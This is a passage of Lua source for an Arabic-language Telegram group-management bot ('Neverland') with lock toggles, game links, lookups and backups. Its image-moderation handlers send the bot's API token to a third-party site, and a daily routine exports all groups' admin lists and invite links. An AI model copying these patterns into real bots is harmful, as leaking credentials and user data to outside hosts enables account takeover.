{text = URL.escape(lock_username1) , callback_data="h"},{text = 'قفل المعرفات', callback_data=msg.sender_user_id_.."/lock_username"},{text = 'فتح المعرفات', callback_data=msg.sender_user_id_.."/unlock_username"},
},
{
{text = URL.escape(lock_tag1) , callback_data="h"},{text = 'قفل التاك', callback_data=msg.sender_user_id_.."/lock_tag"},{text = 'فتح التاك', callback_data=msg.sender_user_id_.."/unlock_tag"},
},
{
{text = URL.escape(mute_gif1) , callback_data="h"},{text = 'قفل المتحركه', callback_data=msg.sender_user_id_.."/mute_gif"},{text = 'فتح المتحركه', callback_data=msg.sender_user_id_.."/unmute_gif"},
},
{
{text = URL.escape(mute_sticker1) , callback_data="h"},{text = 'قفل الملصقات', callback_data=msg.sender_user_id_.."/mute_sticker"},{text = 'فتح الملصقات', callback_data=msg.sender_user_id_.."/unmute_sticker"},
},
{
{text = URL.escape(mute_video1) , callback_data="h"},{text = 'قفل الفيديو', callback_data=msg.sender_user_id_.."/mute_video"},{text = 'فتح الفيديو', callback_data=msg.sender_user_id_.."/unmute_video"},
},
{
{text = 'التالي ...', callback_data=msg.sender_user_id_.."/homelocks1"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Texti).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == '/add' then
local Texti = 'تستطيع تفعيل وتعطيل عبر الازرار'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'تفعيل الطرد ', callback_data=msg.sender_user_id_.."/Ban:Cheking"},{text = 'تعطيل الطرد', callback_data=msg.sender_user_id_.."/unBan:Cheking"},
},
{
{text = 'تفعيل الرفع', callback_data=msg.sender_user_id_.."/Add:Group:Cheking"},{text = 'تعطيل الرفع', callback_data=msg.sender_user_id_.."/unAdd:Group:Cheking"},
},
{
{text = 'تفعيل الرابط', callback_data=msg.sender_user_id_.."/Neverland:Link_Group"},{text = 'تعطيل الرابط', callback_data=msg.sender_user_id_.."/unNeverland:Link_Group"},
},
{
{text = 'تفعيل الترحيب', callback_data=msg.sender_user_id_.."/Neverland:Chek:Welcome"},{text = 'تعطيل الترحيب', callback_data=msg.sender_user_id_.."/unNeverland:Chek:Welcome"},
},
{
{text = 'تفعيل ردود المدير', callback_data=msg.sender_user_id_.."/Neverland:Reply:Manager"},{text = 'تعطيل ردود المدير', callback_data=msg.sender_user_id_.."/unNeverland:Reply:Manager"},
},
{
{text = 'تفعيل ردود المطور', callback_data=msg.sender_user_id_.."/Neverland:Reply:Sudo"},{text = 'تعطيل ردود المطور', callback_data=msg.sender_user_id_.."/unNeverland:Reply:Sudo"},
},
{
{text = 'تفعيل اطردني', callback_data=msg.sender_user_id_.."/Neverland:Kick:Me"},{text = 'تعطيل اطردني', callback_data=msg.sender_user_id_.."/unNeverland:Kick:Me"},
},
{
{text = 'تفعيل المغادره', callback_data=msg.sender_user_id_.."/Neverland:Left:Bot"},{text = 'تعطيل المغادره', callback_data=msg.sender_user_id_.."/unNeverland:Left:Bot"},
},
{
{text = 'تفعيل الاذاعه', callback_data=msg.sender_user_id_.."/Neverland:Status:Bc"},{text = 'تعطيل الاذاعه', callback_data=msg.sender_user_id_.."/unNeverland:Status:Bc"},
},
{
{text = 'تفعيل اوامر التحشيش', callback_data=msg.sender_user_id_.."/Neverland:Fun_Bots"},{text = 'تعطيل اوامر التحشيش', callback_data=msg.sender_user_id_.."/unNeverland:Fun_Bots"},
},
{
{text = 'تفعيل الايدي ', callback_data=msg.sender_user_id_.."/Neverland:Lock:ID:Bot"},{text = 'تعطيل الايدي', callback_data=msg.sender_user_id_.."/unNeverland:Lock:ID:Bot"},
},
{
{text = 'تفعيل الايدي بالصوره', callback_data=msg.sender_user_id_.."/Neverland:Lock:ID:Bot:Photo"},{text = 'تعطيل الايدي بالصوره', callback_data=msg.sender_user_id_.."/unNeverland:Lock:ID:Bot:Photo"},
},
{
{text = 'تفعيل التنظيف', callback_data=msg.sender_user_id_.."/Lock:delmsg"},{text = 'تعطيل التنظيف', callback_data=msg.sender_user_id_.."/unLock:delmsg"},
},
{
{text = 'تفعيل الالعاب', callback_data=msg.sender_user_id_.."/Neverland:Lock:Games"},{text = 'تعطيل الالعاب', callback_data=msg.sender_user_id_.."/unNeverland:Lock:Games"},
},
{
{text = 'تفعيل تاك للكل', callback_data=msg.sender_user_id_.."/Cick:all"},{text = 'تعطيل تاك للكل', callback_data=msg.sender_user_id_.."/unCick:all"},
},
{
{text = 'تفعيل للزخرفه', callback_data=msg.sender_user_id_.."/Neverland:zhrf_Bots"},{text = 'تعطيل الزخرفه', callback_data=msg.sender_user_id_.."/unNeverland:zhrf_Bots"},
},
{
{text = 'تفعيل الابراج', callback_data=msg.sender_user_id_.."/Neverland:brj_Bots"},{text = 'تعطيل الابراج', callback_data=msg.sender_user_id_.."/unNeverland:brj_Bots"},
},
{
{text = 'تفعيل حساب العمر', callback_data=msg.sender_user_id_.."/Neverland:age_Bots"},{text = 'تعطيل حساب للعمر', callback_data=msg.sender_user_id_.."/unNeverland:age_Bots"},
},
{
{text = 'تفعيل الافلام', callback_data=msg.sender_user_id_.."/Neverland:movie_bot"},{text = 'تعطيل الافلام', callback_data=msg.sender_user_id_.."/unNeverland:movie_bot"},
},
{
{text = 'تفعيل البوت الخدمي', callback_data=msg.sender_user_id_.."/Neverland:Free:Add:Bots"},{text = 'تعطيل البوت الخدمي', callback_data=msg.sender_user_id_.."/unNeverland:Free:Add:Bots"},
},
{
{text = 'تفعيل الانستا', callback_data=msg.sender_user_id_.."/Neverland:insta_bot"},{text = 'تعطيل الانستا', callback_data=msg.sender_user_id_.."/unNeverland:insta_bot"},
},

}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Texti).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == "تعطيل المسح التلقائي" and Owner(msg) then        
database:set(bot_id.."y:msg:media"..msg.chat_id_,true)
Reply_Status(msg,msg.sender_user_id_,"lock",'✦┇تم تعطيل المسح التلقائي للميديا')
return false
end 
if text == "تفعيل المسح التلقائي" and Owner(msg) then        
database:set(bot_id.."y:msg:media"..msg.chat_id_,true)
Reply_Status(msg,msg.sender_user_id_,"lock",'✦┇تم تفعيل المسح التلقائي للميديا')
return false
end 
if text == 'تعطيل الالعاب الاحترافيه' and Owner(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id..'lockGeamVip'..msg.chat_id_,true)  
send(msg.chat_id_, msg.id_,'*✦┇تم تعطيل الالعاب الاحترافيه*')
end
if text == 'تفعيل الالعاب الاحترافيه' and Owner(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id..'lockGeamVip'..msg.chat_id_)  
send(msg.chat_id_, msg.id_,'*✦┇تم تفعيل الالعاب الاحترافيه*')
end
if text == 'الالعاب الاحترافيه' and Owner(msg) then  
if not database:get(bot_id..'lockGeamVip'..msg.chat_id_) then
_key = {
{{text="♟ Chess Game ♟",url='https://t.me/T4TTTTBOT?game=chess'}},
{{text="لعبة فلابي بيرد 🐥",url='https://t.me/awesomebot?game=FlappyBird'},{text="تحداني فالرياضيات 🔢",url='https://t.me/gamebot?game=MathBattle'}},
{{text= "سباق الدراجات 🏍",url='https://t.me/gamee?game=MotoFX'}},
{{text="سباق سيارات 🏎",url='https://t.me/gamee?game=F1Racer'},{text="متشابه 👾",url='https://t.me/gamee?game=DiamondRows'}},
{{text="كرة قدم ⚽",url='https://t.me/gamee?game=FootballStar'}},
{{text="دومنا🥇",url='https://vipgames.com/play/?affiliateId=wpDom/#/games/domino/lobby'},{text="❕ليدو",url='https://vipgames.com/play/?affiliateId=wpVG#/games/ludo/lobby'}},
{{text="ورق🤹‍♂",url='https://t.me/gamee?game=Hexonix'},{text="Hexonix❌",url='https://t.me/gamee?game=Hexonix'}},
{{text="MotoFx🏍️",url='https://t.me/gamee?game=MotoFx'}},
{{text="لعبة 2048 🎰",url='https://t.me/awesomebot?game=g2048'},{text="Squares🏁",url='https://t.me/gamee?game=Squares'}},
{{text="Atomic 1▶️",url='https://t.me/gamee?game=AtomicDrop1'},{text="Corsairs",url='https://t.me/gamebot?game=Corsairs'}},
{{text="LumberJack",url='https://t.me/gamebot?game=LumberJack'}},
{{text="LittlePlane",url='https://t.me/gamee?game=LittlePlane'},{text="RollerDisco",url='https://t.me/gamee?game=RollerDisco'}},
{{text="🦖 Dragon Game 🦖",url='https://t.me/T4TTTTBOT?game=dragon'},{text="🐍 3D Snake Game 🐍",url='https://t.me/T4TTTTBOT?game=snake'}},
{{text="🔵 Color Game 🔴",url='https://t.me/T4TTTTBOT?game=color'}},
{{text="🚀 Rocket Game 🚀",url='https://t.me/T4TTTTBOT?game=rocket'},{text="🏹 Arrow Game 🏹",url='https://t.me/T4TTTTBOT?game=arrow'}},
{{text = 'Neverland Team', url="t.me/TEAM_Neverland"}},
{{text = '↞مطور السورس↞', url="t.me/B333BB"}},
}
send_inlin_key(msg.chat_id_," *✦┇قائمه الالعاب الاحترافيه اضغط للعب*",_key,msg.id_)
else
send(msg.chat_id_, msg.id_," *✦┇الالعاب الاحترافيه معطله في الوقت الحالي .*")
end
end
if text == "تعطيل الزخرفه" and Owner(msg) then
send(msg.chat_id_, msg.id_, '✦┇تم تعطيل الزخرفه')
database:set(bot_id.."Neverland:zhrf_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل الزخرفه" and Owner(msg) then
send(msg.chat_id_, msg.id_,'✦┇تم تفعيل الزخرفه')
database:set(bot_id.."Neverland:zhrf_Bots"..msg.chat_id_,"open")
end
if text and text:match("^زخرفه (.*)$") and database:get(bot_id.."Neverland:zhrf_Bots"..msg.chat_id_) == "open" then
local TextZhrfa = text:match("^زخرفه (.*)$")
zh = https.request('https://black-source.tk/BlackTeAM/frills.php?en='..URL.escape(TextZhrfa)..'')
zx = JSON.decode(zh)
t = "\n✦┇قائمه الزخرفه \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
i = 0
for k,v in pairs(zx.ok) do
i = i + 1
t = t..i.."-  `"..v.."` \n"
end
send(msg.chat_id_, msg.id_, t..'┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n✦┇اضغط على الاسم ليتم نسخه')
end
if text == "تعطيل الابراج" and Owner(msg) then
send(msg.chat_id_, msg.id_, '✦┇تم تعطيل الابراج')
database:set(bot_id.."Neverland:brj_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل الابراج" and Owner(msg) then
send(msg.chat_id_, msg.id_,'✦┇تم تفعيل الابراج')
database:set(bot_id.."Neverland:brj_Bots"..msg.chat_id_,"open")
end
if text and text:match("^برج (.*)$") and database:get(bot_id.."Neverland:brj_Bots"..msg.chat_id_) == "open" then
local Textbrj = text:match("^برج (.*)$")
gk = https.request('https://black-source.tk/BlackTeAM/Horoscopes.php?br='..URL.escape(Textbrj)..'')
br = JSON.decode(gk)
send(msg.chat_id_, msg.id_, br.ok.hso)
end
if text == "راسلني" or text =="خاص" or text =="خا"or text =="خ" or text =="خاصك" then
rpl = {"نعم ﺣحب 💓"," ﮪݪـﯛ عمري تفضل💕","ها حبب كول؟ ","زحفتلك كول شتريد 😂🙂","هها موكلت 💓🥺","راسلتك 👋🏼😂"};
sender = rpl[math.random(#rpl)]
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendmessage?chat_id=' .. msg.sender_user_id_ .. '&text=' .. URL.escape(sender))
end
if text == "تعطيل حساب العمر" and Owner(msg) then
send(msg.chat_id_, msg.id_, '✦┇تم تعطيل حساب العمر')
database:set(bot_id.."Neverland:age_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل حساب العمر" and Owner(msg) then
send(msg.chat_id_, msg.id_,'✦┇تم تفعيل حساب العمر')
database:set(bot_id.."Neverland:age_Bots"..msg.chat_id_,"open")
end
if text and text:match("^احسب (.*)$") and database:get(bot_id.."Neverland:age_Bots"..msg.chat_id_) == "open" then
local Textage = text:match("^احسب (.*)$")
ge = https.request('https://black-source.tk/BlackTeAM/Calculateage.php?age='..URL.escape(Textage)..'')
ag = JSON.decode(ge)
send(msg.chat_id_, msg.id_, ag.ok.hso)
end
if text and not database:get(bot_id.."AutoFile") then
Time = database:get(bot_id.."AutoFile:Time")
if Time then 
if Time ~= os.date("%x") then  
local list = database:smembers(bot_id..'Chek:Groups')  
local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
for k,v in pairs(list) do   
NAME = 'Neverland Chat'
ASAS = database:smembers(bot_id.."Neverland:Basic:Constructor"..v)
MNSH = database:smembers(bot_id.."Neverland:Constructor"..v)
MDER = database:smembers(bot_id.."Neverland:Manager"..v)
MOD = database:smembers(bot_id.."Neverland:Mod:User"..v)
link = database:get(bot_id.."Neverland:Link_Group"..v) or ''
if k == 1 then
t = t..'"'..v..'":{"Neverland":"'..NAME..'",'
else
t = t..',"'..v..'":{"Neverland":"'..NAME..'",'
end
if #ASAS ~= 0 then 
t = t..'"ASAS":['
for k,v in pairs(ASAS) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MOD ~= 0 then
t = t..'"MOD":['
for k,v in pairs(MOD) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MDER ~= 0 then
t = t..'"MDER":['
for k,v in pairs(MDER) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MNSH ~= 0 then
t = t..'"MNSH":['
for k,v in pairs(MNSH) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'"linkgroup":"'..link..'"}' or ''
end
t = t..'}}'
local File = io.open('./File_Libs/'..bot_id..'.json', "w")
File:write(t)
File:close()
sendDocument(Id_Sudo, msg.id_,'./File_Libs/'..bot_id..'.json', '✦┇عدد مجموعات التي في البوت { '..#list..'}')
database:set(bot_id.."AutoFile:Time",os.date("%x"))
end
else 
database:set(bot_id.."AutoFile:Time",os.date("%x"))
end
end
if text == "تعطيل الانستا" and Owner(msg) then
send(msg.chat_id_, msg.id_, '✦┇تم تعطيل الانستا')
database:set(bot_id.."Neverland:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Owner(msg) then
send(msg.chat_id_, msg.id_,'✦┇تم تفعيل الانستا')
database:set(bot_id.."Neverland:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."Neverland:insta_bot"..msg.chat_id_) == "open" then
local Textni = text:match("^معلومات (.*)$")
data,res = https.request('https://black-source.tk/BlackTeAM/infoInstagram.php?username='..URL.escape(Textni)..'')
if res == 200 then
Alsh = json:decode(data)
if Alsh.Info == true then
local msg_id = msg.id_/2097152/0.5
SendP(msg.chat_id_, msg_id,Alsh.ph, Alsh.info) 
end
end
end
if text == "تعطيل الافلام" and Owner(msg) then
send(msg.chat_id_, msg.id_, '✦┇تم تعطيل الافلام')
database:set(bot_id.."Neverland:movie_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الافلام" and Owner(msg) then
send(msg.chat_id_, msg.id_,'✦┇تم تفعيل الافلام')
database:set(bot_id.."Neverland:movie_bot"..msg.chat_id_,"open")
end

if text and text:match("^فلم (.*)$") and database:get(bot_id.."Neverland:movie_bot"..msg.chat_id_) == "open" then
local Textm = text:match("^فلم (.*)$")
data,res = https.request('https://boyka-api.ml/movie.php?serch='..URL.escape(Textm)..'')
if res == 200 then
getmo = json:decode(data)
if getmo.Info == true then
local Text ='قصه الفلم'..getmo.info
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'مشاهده الفلم بجوده 240',url=getmo.sd}},
{{text = 'مشاهده الفلم بجوده 480', url=getmo.Web},{text = 'مشاهده الفلم بجوده 1080', url=getmo.hd}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
end
if (msg.content_.sticker_)  and msg.reply_to_message_id_ == 0 and database:get(bot_id.."Neverland:Lock:Xn"..msg.chat_id_)=="del" then      
sticker_id = msg.content_.sticker_.sticker_.persistent_id_
st = https.request('https://black-source.tk/BlackTeAM/ImageInfo.php?token='..token..'&url='..sticker_id.."&type=sticker")
eker = JSON.decode(st)
if eker.ok.Info == "Indecent" then
local list = database:smembers(bot_id.."Neverland:Sudo:User")
t = "✦┇المنشئين الاساسين تعالو مخرب \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Neverland:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "✦┇ماكو منششئين يشوفولك جاره"
end
Reply_Status(msg,msg.sender_user_id_,"reply","✦┇قام بنشر ملصق اباحيه\n"..t)  
DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.id_),msg.id_})   
end   
end
if (msg.content_.photo_) and msg.reply_to_message_id_ == 0 and database:get(bot_id.."Neverland:Lock:Xn"..msg.chat_id_)=="del" then
photo_id = msg.content_.photo_.sizes_[1].photo_.persistent_id_  
Srrt = https.request('https://black-source.tk/BlackTeAM/ImageInfo.php?token='..token..'&url='..photo_id.."&type=photo")
Sto = JSON.decode(Srrt)
if Sto.ok.Info == "Indecent" then
local list = database:smembers(bot_id.."Neverland:Sudo:User")
t = "✦┇المنشئين الاساسين تعالو مخرب \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Neverland:User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "✦┇ماكو منششئين يشوفولك جاره"
end
Reply_Status(msg,msg.sender_user_id_,"reply","✦┇قام بنشر صوره اباحيه\n"..t)  
DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.id_),msg.id_})   
end   
end
if text == 'تفعيل البوت الخدمي' and DevNeverland(msg) then  
database:del(bot_id..'Neverland:Free:Add:Bots') 
send(msg.chat_id_, msg.id_,'✦┇تم تفعيل البوت الخدمي ') 
end
if text == 'تعطيل البوت الخدمي' and DevNeverland(msg) then  
database:set(bot_id..'Neverland:Free:Add:Bots',true) 
send(msg.chat_id_, msg.id_,'✦┇تم تعطيل البوت الخدمي') 
end
if text and text:match("^تعين عدد الاعضاء (%d+)$") and DevNeverland(msg) then
local Num = text:match("تعين عدد الاعضاء (%d+)$") 
database:set(bot_id..'Neverland:Num:Add:Bot',Num) 
send(msg.chat_id_, msg.id_,'✦┇تم وضع عدد الاعضاء *~'..Num..'* عضو')
end
if text and text:match("^وضع عدد الكانسر (%d+)$") and Owner(msg) then 
local Min = text:match("^وضع عدد الكانسر (%d+)$")
database:set(bot_id..'Min:kansers'..msg.chat_id_,Min)
send(msg.chat_id_, msg.id_, '\n✦┇تم وضع عدد حروف الاسم '..Min..' حرف')
end 
if text =='الاحصائيات' and DevBot(msg) then
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'Neverland:UsersBot')  
send(msg.chat_id_, msg.id_,'✦┇احصائيات البوت \n\n✦┇عدد المجموعات *~ '..Groups..'\n✦┇عدد المشتركين ~ '..Users..'*')
end
if text == 'جلب نسخه احتياطيه' and DevNeverland(msg) then
local list = database:smembers(bot_id..'Chek:Groups')  
local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
for k,v in pairs(list) do   
NAME = 'Neverland Chat'
ASAS = database:smembers(bot_id.."Neverland:Basic:Constructor"..v)
MNSH = database:smembers(bot_id.."Neverland:Constructor"..v)
MDER = database:smembers(bot_id.."Neverland:Manager"..v)
MOD = database:smembers(bot_id.."Neverland:Mod:User"..v)
link = database:get(bot_id.."Neverland:Link_Group"..v) or ''
if k == 1 then
t = t..'"'..v..'":{"Neverland":"'..NAME..'",'
else
t = t..',"'..v..'":{"Neverland":"'..NAME..'",'
end
if #ASAS ~= 0 then 
t = t..'"ASAS":['
for k,v in pairs(ASAS) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MOD ~= 0 then
t = t..'"MOD":['
for k,v in pairs(MOD) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MDER ~= 0 then
t = t..'"MDER":['
for k,v in pairs(MDER) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MNSH ~= 0 then
t = t..'"MNSH":['
for k,v in pairs(MNSH) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'"linkgroup":"'..link..'"}' or ''
end
t = t..'}}'
local File = io.open('./File_Libs/'..bot_id..'.json', "w")
File:write(t)
File:close()
sendDocument(msg.chat_id_, msg.id_,'./File_Libs/'..bot_id..'.json', '✦┇عدد مجموعات التي في البوت { '..#list..'}')
end
if text == 'المطور' or text == 'مطور' or text == 'المطورين' then
local Text_Dev = database:get(bot_id..'Neverland:Text_Dev')
if Text_Dev then 
send(msg.chat_id_, msg.id_,Text_Dev)
else
tdcli_function ({ID = "GetUser",user_id_ = Sudo},function(arg,data) 
send(msg.chat_id_, msg.id_,"✦┇المطور ↜ ["..data.first_name_.."](T.me/"..data.username_..")")  
end,nil)   
end
end
if text == 'نقل الاحصائيات' and DevNeverland(msg) then
local Users = database:smembers('Neverland:'..bot_id.."userss")
local Groups = database:smembers('Neverland:'..bot_id..'groups') 
for i = 1, #Groups do
database:sadd(bot_id..'Chek:Groups',Groups[i])  
end
for i = 1, #Users do
database:sadd(bot_id..'Neverland:UsersBot',Users[i])  
end
send(msg.chat_id_, msg.id_,'✦┇تم نقل : '..#Groups..' كروب\n✦┇تم نقل : '..#Users..' مشترك \n✦┇من التحديث القديم الى التحديث الجديد')
end
if text == 'حذف كليشه المطور' and DevNeverland(msg) then
database:del(bot_id..'Neverland:Text_Dev')
send(msg.chat_id_, msg.id_,'✦┇تم حذف كليشه المطور')
end
if text == 'وضع كليشه المطور' and DevNeverland(msg) then
database:set(bot_id..'Neverland:Set:Text_Dev'..msg.chat_id_,true)
send(msg.chat_id_,msg.id_,'*✦┇ارسل الكليشه الان*')
return false
end
if text and database:get(bot_id..'Neverland:Set:Text_Dev'..msg.chat_id_) then
if text == 'الغاء' then 
database:del(bot_id..'Neverland:Set:Text_Dev'..msg.chat_id_)
send(msg.chat_id_,msg.id_,'✦┇تم الغاء حفظ كليشة المطور')
return false
end
database:set(bot_id..'Neverland:Text_Dev',text)
database:del(bot_id..'Neverland:Set:Text_Dev'..msg.chat_id_)
send(msg.chat_id_,msg.id_,'✦┇تم حفظ كليشة المطور')
return false
end
if text == 'رفع النسخه الاحتياطيه' and DevNeverland(msg) then   
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
add_file(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == "الساعه" then
local yytesj20 = "\n الساعه الان : "..os.date("%I:%M%p")
send(msg.chat_id_, msg.id_,yytesj20)
end

if text == "التاريخ" then
local cfhoog =  "\n التاريخ : "..os.date("%Y/%m/%d")
send(msg.chat_id_, msg.id_,cfhoog)
end

if text == "تحديث" and DevNeverland(msg) then
dofile("Neverland.lua")  
send(msg.chat_id_, msg.id_, "*Ok Im Reload ...*")
end

if text == "تفعيل الرسائل اليوميه" and Owner(msg) then
send(msg.chat_id_, msg.id_, '*✦┇تم تفعيل الرسائل اليوميه*')
database:set(bot_id.."msg:match:"..msg.chat_id_,true)
end
if text == "تعطيل الرسائل اليوميه" and Owner(msg) then
send(msg.chat_id_, msg.id_,'*✦┇تم تعطيل الرسائل اليوميه*')
database:del(bot_id.." msg:match:"..msg.chat_id_)
end
if database:get(bot_id.."msg:match:"..msg.chat_id_) then
if msg.content_.ID then
get_msg = database:get(bot_id.."msg:match:"..msg.sender_user_id_..":"..msg.chat_id_) or 0
gms = get_msg + 1
database:setex(bot_id..'msg:match:'..msg.sender_user_id_..":"..msg.chat_id_,86400,gms)
end
if text == "تفاعلي اليوم" and tonumber(msg.reply_to_message_id_) == 0 then    
get_msg = database:get(bot_id.."msg:match:"..msg.sender_user_id_..":"..msg.chat_id_) or 0
send(msg.chat_id_, msg.id_,"*✦┇عدد رسائلك الكلي هو :-*\n"..get_msg.." *من الرسائل*")
end  
if text == "تفاعله اليوم" and tonumber(msg.reply_to_message_id_) > 0 then    
if tonumber(msg.reply_to_message_id_) ~= 0 then 
function prom_reply(extra, result, success) 
get_msg = database:get(bot_id.."msg:match:"..result.sender_user_id_..":"..msg.chat_id_) or 0
send(msg.chat_id_, msg.id_,"*✦┇عدد رسائل اشخص الكلي هو :-*\n"..get_msg.." *من الرسائل*")
end  
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},prom_reply, nil)
end
end
end
if text == 'السورس' or text == 'سورس' or text == 'ياسورس' or text == 'يا سورس' then  
Text = [[*
✦┇Source Neverland 
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉*

]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Channel Source ،', url="https://t.me/TEAM_Neverland"},
},
{
{text = 'Annotations Source', url="https://t.me/DEV_Neverland"},
},
{
{text = 'programmer Source²', url="https://t.me/B333BB"},
},
{
{text = 'Developer Source !', url="https://t.me/B333BB"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
if text == 'اريد بوت' or text == 'اريد مطور' or text == 'خوش سورس' or text == 'مطور السورس' or text == 'اريد بوت تمبلر' or text == 'سورس نيفرلاند' or text == 'عجبني البوت' or text == 'منو منصبلك' or text == 'منو مطور السورس' or text == 'اريد انصب بوت' or text == 'مبرمج السورس' or text == 'انصبلك بوت' then
Text = [[
✦┇Dev User : @B333BB
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'مطور السورس',url="https://t.me/B333BB"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/B333BB&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
if text == 'رابط الحذف' or text == 'بوت الحذف' then  
Text = [[*
- اهلا بك عزيزي ؛
- في بوت حذف حسابات التليجرام -
✦┇وضيفة البوت مساعدتك في حذف حسابك 💌 •
- دون الذهاب الى موقع الحذف ☑️ •
- لحذف حسابك اضغط على زر حذف الحساب ؛*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '𝗱𝗲𝗹𝗲𝘁𝗲 𝗯𝗼𝘁',url="https://t.me/F89Fbot"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/F89Fbot&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
if text and text:match('^الحساب (%d+)$') then
local id = text:match('^الحساب (%d+)$')
local text = 'اضغط لمشاهده الحساب'
tdcli_function ({ID="SendMessage", chat_id_=msg.chat_id_, reply_to_message_id_=msg.id_, disable_notification_=0, from_background_=1, reply_markup_=nil, input_message_content_={ID="InputMessageText", text_=text, disable_web_page_preview_=1, clear_draft_=0, entities_={[0] = {ID="MessageEntityMentionName", offset_=0, length_=19, user_id_=id}}}}, dl_cb, nil)
end
local function oChat(chat_id,cb)
tdcli_function ({
ID = "OpenChat",
chat_id_ = chat_id
}, cb, nil)
end
if text == 'الاوامر' and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
